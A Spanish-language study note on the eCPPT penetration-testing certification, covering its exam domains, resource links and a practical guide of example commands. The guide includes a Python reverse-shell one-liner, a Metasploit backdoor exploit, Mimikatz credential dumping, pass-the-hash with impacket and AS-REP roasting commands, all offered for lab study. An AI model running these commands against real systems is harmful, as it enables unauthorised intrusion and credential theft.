---
date: 2025-04-14 03:40
title: eCPPT
tags:
keywords:
source:
status: 🌟
Parent: "[[Area-Sistemas]]"
cssclasses:
public_note: "true"
category: pentesting
categories:
  - pentesting
  - Hacking
  - hide-embedded-header1
  - wide
  - ciberseguridad
---
# eCPPT
`$= dv.current().file.tags.join(" ")`

## Descripción
El **eLearnSecurity Certified Professional Penetration Tester (eCPPT)** es una certificación orientada a profesionales de la seguridad que desean demostrar competencias prácticas en pruebas de penetración. La certificación valida habilidades en **evaluación de seguridad de redes, aplicaciones web, explotación de vulnerabilidades y reportes profesionales**.

- Duración del curso: Variable según modalidad.
- Modalidad: Online, práctico y basado en laboratorio.
- Enfoque: Ejercicios hands-on y escenarios de pentesting reales.
- Reconocimiento: Internacional, orientado a la práctica más que a la teoría.

## Objetivos de la certificación
- Identificar y explotar vulnerabilidades en sistemas y aplicaciones.
- Aplicar metodologías profesionales de **pentesting**.
- Elaborar informes de seguridad claros, técnicos y profesionales.
- Mejorar la capacidad de análisis y resolución de problemas en entornos controlados de pruebas.

## Contenido clave
- **Reconocimiento y Enumeración**
	- Descubrimiento de hosts y servicios.
	- Escaneo de puertos y fingerprinting.
- **Explotación**
	- Explotación de servicios vulnerables.
	- Escalada de privilegios en sistemas Windows y Linux.
- **Post-explotación**
	- Mantenimiento de acceso.
	- Exfiltración de información.
- **Pentesting Web**
	- SQL Injection, XSS, CSRF y vulnerabilidades de lógica de negocio.
	- Uso de herramientas: Burp Suite, OWASP ZAP.
- **Reportes**
	- Documentación de hallazgos.
	- Recomendaciones de mitigación y comunicación a clientes.

## Metodología de estudio
- **Laboratorios prácticos**: Cada módulo contiene escenarios de práctica para replicar entornos reales.
- **Examen práctico**: Incluye una máquina o laboratorio que debe ser explotado y reportado.
- **Notas y recursos comunitarios**: Acceso a repositorios con ejercicios, scripts y guías.

## Recursos y notas de estudio
- [eCPPT Certification - INE Security](https://security.ine.com/certifications/ecppt-certification/)  
- [GitHub - dev-angelist/eCPPTv2-PTP-Notes: INE/eLearnSecurity Certified Professional Penetration Tester (eCPPT) / PTP v2 Notes](https://github.com/dev-angelist/eCPPTv2-PTP-Notes)  
- [GitHub - calacuda/eCPPT-resources: A compilation of resources for studying for the eCPPTv2](https://github.com/calacuda/eCPPT-resources?tab=readme-ov-file)  
- [GitHub - Certs-Study/eCPPTv2-Penetration-Testing-Professional: Study notes to get eCPPT Certification. Join the community on Discord](https://github.com/Certs-Study/eCPPTv2-Penetration-Testing-Professional)  
- [GitHub - Cyber-Security-Certifications/eCPPTv2-Notes-AIO: All binaries, tools, wordlists and tutorials you need to pass eCPPTv2 - For Free!](https://github.com/Cyber-Security-Certifications/eCPPTv2-Notes-AIO)  
- [GitHub - 0xMat10/eCPPT_Prep: This repo contains Machines and Notes for practicing for eCPPTv2 exam](https://github.com/0xMat10/eCPPT_Prep?tab=readme-ov-file)  
- [GitHub - Dragkob/eCPPT: INE eCPPTv3 Cheat Sheet / Course Notes. Comprehensive course notes and cheat sheets for eCPPTv3](https://github.com/Dragkob/eCPPT?tab=readme-ov-file)  

## Consejos de preparación
- Practicar en **entornos controlados** y máquinas virtuales.
- Leer y analizar **reportes de pruebas** de otros profesionales.
- Mantenerse actualizado con **vulnerabilidades recientes** y herramientas de pentesting.
- Participar en **comunidades y foros** para resolver dudas y compartir experiencias.
- Realizar ejercicios de **escalada de privilegios**, explotación y post-explotación regularmente.

## Enlaces relacionados
- [Pentesting](/ciberseguridad/pentesting/)
- certificaciones

# Temario completo de la certificación eCPPT

## 1. Información general del temario
El **temario oficial de la certificación eCPPT (Certified Professional Penetration Tester)** se organiza en **dominios y sub‑dominios prácticos** que cubren todo el proceso de pruebas de penetración: desde reconocimiento hasta explotación, post‑explotación y reporte profesional. El enfoque es **100% práctico**, con énfasis en escenarios reales de pentesting.

## 2. Dominios del examen (Estructura oficial)
### 2.1. Information Gathering & Reconnaissance (10%)
- Descubrimiento de hosts y servicios (Host Discovery).  
- Escaneo de puertos y servicios (Port Scanning).  
- Enumeración de información de servicios abiertos (service enumeration).  
- Enumeración DNS y técnicas avanzadas de reconocimiento.

### 2.2. Initial Access (15%)
- Enumeración de usuarios para identificar cuentas válidas.  
- Técnicas de password spraying y ataques de fuerza bruta contra servicios de acceso remoto.  
- Técnicas de acceso inicial a sistemas internos.

### 2.3. Web Application Penetration Testing (15%)
- Enumeración y análisis de aplicaciones web para identificar puntos de entrada.  
- Detección y explotación de vulnerabilidades comunes:  
	- SQL Injection (SQLi).  
	- Cross‑Site Scripting (XSS).  
	- Command Injection y otras inyecciones.  
- Ataques de fuerza bruta en formularios de autenticación.  
- Explotación de componentes vulnerables o desactualizados.  
- Exfiltración de datos de aplicaciones y bases de datos.

### 2.4. Exploitation & Post‑Exploitation (25%)
- Identificación y explotación de vulnerabilidades o malas configuraciones en servicios.  
- Escalada de privilegios local: Windows y Linux.  
- Dumping y cracking de hashes de contraseñas.  
- Identificación y extracción de credenciales inseguras almacenadas localmente.  
- Persistencia y técnicas de post‑explotación (mantener acceso).

### 2.5. Exploit Development (5%)
- Desarrollo o modificación de código de exploit para acceso inicial y post‑explotación.  
- Identificación y explotación de vulnerabilidades de corrupción de memoria (Stack/Buffer Overflows).  
- Técnicas básicas de debugging para exploits.

### 2.6. Active Directory Penetration Testing (30%)
- Enumeración completa de entornos Active Directory.  
- Identificación de cuentas de dominio con contraseñas débiles o vacías.  
- Ataques Kerberos: AS‑REP Roasting, Pass‑the‑Hash, Pass‑the‑Ticket.  
- Técnicas de movimiento lateral dentro de la red.  
- Obtención de privilegios de Domain Admin y explotación a nivel dominio.

## 3. Contenidos temáticos extendidos (basados en curso/recursos)
### 3.1. Reconocimiento y Scanning
- Técnicas avanzadas de reconocimiento (DNS enum, servicio fingerprinting).  
- Uso de herramientas: **Nmap, Masscan, enum4linux, etc**.

### 3.2. Pentesting de Aplicaciones Web
- OWASP Top 10 enfoque práctico.  
- Uso de **Burp Suite, sqlmap, wfuzz**.  
- Validación y explotación manual vs automatizada.

### 3.3. Explotación de Sistemas
- Técnicas de explotación en Linux y Windows: **Pipes, Shells inversos**.  
- Uso de **Metasploit** y módulos avanzados.

### 3.4. PowerShell y Scripting
- Uso de **PowerShell para enumeración y post‑explotación**.  
- Scripts de automatización para tareas de pentesting.

### 3.5. Wi‑Fi y Redes Inalámbricas
- Fundamentos de 802.11.  
- Ataques comunes de Wi‑Fi (de autenticación, fuerza bruta).

### 3.6. Técnicas Avanzadas de Reporte
- Formato profesional de reporte de pentesting.  
- Impacto, PoC (Proof of Concept) y recomendaciones de mitigación.

## 4. Laboratorios y prácticas
- **Laboratorios prácticos hands‑on** para aplicar cada dominio del temario.  
- Escenarios reales de pentesting con múltiples vectores de ataque.  
- Integración de flujos completos: reconocimiento → explotación → escalada → reporte.

## 5. Requisitos previos y habilidades
- Buen entendimiento de sistemas operativos Windows y Linux.  
- Conocimientos sólidos de redes y protocolos TCP/IP.  
- Experiencia con herramientas de pentesting.  
- Habilidades de scripting básico y lectura/modificación de código.

## 6. Fuentes oficiales y recursos
- [Pentesting](/ciberseguridad/pentesting/)  
- certificaciones  
- [eCPPT Certification - INE Security](https://security.ine.com/certifications/ecppt-certification/)  
- [GitHub - dev-angelist/eCPPTv2-PTP-Notes](https://github.com/dev-angelist/eCPPTv2-PTP-Notes)  
- [GitHub - calacuda/eCPPT-resources](https://github.com/calacuda/eCPPT-resources?tab=readme-ov-file)  
- [GitHub - Certs-Study/eCPPTv2-Penetration-Testing-Professional](https://github.com/Certs-Study/eCPPTv2-Penetration-Testing-Professional)  
- [GitHub - Cyber-Security-Certifications/eCPPTv2-Notes-AIO](https://github.com/Cyber-Security-Certifications/eCPPTv2-Notes-AIO)  
- [GitHub - 0xMat10/eCPPT_Prep](https://github.com/0xMat10/eCPPT_Prep?tab=readme-ov-file)  
- [GitHub - Dragkob/eCPPT (v3 notes)](https://github.com/Dragkob/eCPPT?tab=readme-ov-file)

# Guía de implementaciones para eCPPT: Casos de uso y ejemplos de configuración

## 1. Reconocimiento y Enumeración
### Caso de uso
Descubrir hosts activos y servicios abiertos en una red corporativa antes de realizar un pentest.

### Herramientas y ejemplos
- **Nmap**
	- Escaneo rápido de red:
{% raw %}
```bash
nmap -sP 192.168.1.0/24
```
{% endraw %}
- Escaneo de puertos y servicios con detección de versión:
{% raw %}
```bash
nmap -sV -p 1-65535 192.168.1.10
```
{% endraw %}
- **enum4linux** (enumeración de usuarios y shares en sistemas Windows):
{% raw %}
```bash
enum4linux -a 192.168.1.10
```
{% endraw %}
- **DNS Recon**
	- Enumeración de subdominios con **sublist3r**:
{% raw %}
```bash
sublist3r -d ejemplo.com
```
{% endraw %}

---

## 2. Pentesting Web
### Caso de uso
Identificar vulnerabilidades de inyección en una aplicación web de prueba.

### Herramientas y ejemplos
- **Burp Suite**
	- Configuración de Proxy:
		- Puerto local: 8080
		- Interceptar tráfico de navegador para pruebas.
- **SQLMap**
	- Detección y explotación de SQL Injection:
{% raw %}
```bash
sqlmap -u "http://ejemplo.com/login.php" --forms --batch --risk=3 --level=5
```
{% endraw %}
- **wfuzz**
	- Fuerza bruta de parámetros o directorios:
{% raw %}
```bash
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://ejemplo.com/FUZZ
```
{% endraw %}

---

## 3. Explotación de Sistemas
### Caso de uso
Acceso inicial a un host Linux vulnerable y escalada de privilegios.

### Herramientas y ejemplos
- **Metasploit Framework**
	- Escaneo de vulnerabilidad y explotación:
{% raw %}
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.1.15
run
	```
{% endraw %}
- **Shell inversa en Python**:
{% raw %}
```python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.1.20",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
{% endraw %}

---

## 4. Post-explotación
### Caso de uso
Recolectar información sensible y mantener persistencia en un host comprometido.

### Herramientas y ejemplos
- **Linux**
- Escalado de privilegios:
{% raw %}
```bash
sudo -l
find / -perm -4000 2>/dev/null
```
{% endraw %}
- Dumping de contraseñas:
{% raw %}
```bash
grep -i password /etc/shadow
```
{% endraw %}
- **Windows**
- PowerShell para enumerar usuarios:
{% raw %}
```powershell
Get-LocalUser
Get-LocalGroupMember Administrators
```
{% endraw %}
- Obtención de hashes con mimikatz:
{% raw %}
```powershell
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords" "exit"'
	```
{% endraw %}

---

## 5. Active Directory Pentesting
### Caso de uso
Movimientos laterales y escalada en un entorno AD para pruebas internas.

### Herramientas y ejemplos
- **BloodHound**
- Analizar relaciones de privilegios en AD:
{% raw %}
```powershell
Invoke-BloodHound -CollectionMethod All -Domain ejemplo.local -ZipFileName data.zip
```
{% endraw %}
- **Kerberos Attacks**
- AS-REP Roasting:
{% raw %}
```bash
GetNPUsers.py ejemplo.local/ -usersfile users.txt
```
{% endraw %}
- Pass-the-Hash:
{% raw %}
```bash
impacket-psexec -hashes <LMHASH>:<NTHASH> user@192.168.1.10
	```
{% endraw %}

---

## 6. Reporting y Documentación
### Caso de uso
Generar informes profesionales con hallazgos y recomendaciones.

### Ejemplo de estructura de reporte
- **Resumen ejecutivo**: Hallazgos críticos y riesgos para el negocio.  
- **Metodología**: Técnicas y herramientas utilizadas.  
- **Hallazgos técnicos**: Vulnerabilidades, pruebas PoC, capturas de pantalla.  
- **Recomendaciones**: Remediaciones y mitigaciones.  
- **Apéndices**: Scripts, logs y evidencias técnicas.

---

## 7. Laboratorios prácticos
- Configurar **VMs de laboratorio** con Windows y Linux.  
- Implementar escenarios de vulnerabilidades intencionadas para prácticas de explotación.  
- Integrar flujos completos: Reconocimiento → Explotación → Escalada → Reporte.  

---

## 8. Buenas prácticas
- Mantener un **entorno aislado** para pruebas.  
- Documentar cada paso y comando utilizado.  
- Realizar pruebas **repetidas y controladas** para validar hallazgos.  
- Actualizar herramientas y scripts antes de cada laboratorio.  

---

## Recursos y referencias
- [Pentesting](/ciberseguridad/pentesting/)  
- certificaciones  
- [eCPPT Certification - INE Security](https://security.ine.com/certifications/ecppt-certification/)  
- [GitHub - dev-angelist/eCPPTv2-PTP-Notes](https://github.com/dev-angelist/eCPPTv2-PTP-Notes)  
- [GitHub - calacuda/eCPPT-resources](https://github.com/calacuda/eCPPT-resources?tab=readme-ov-file)  
- [GitHub - Dragkob/eCPPT (v3 notes)](https://github.com/Dragkob/eCPPT?tab=readme-ov-file)
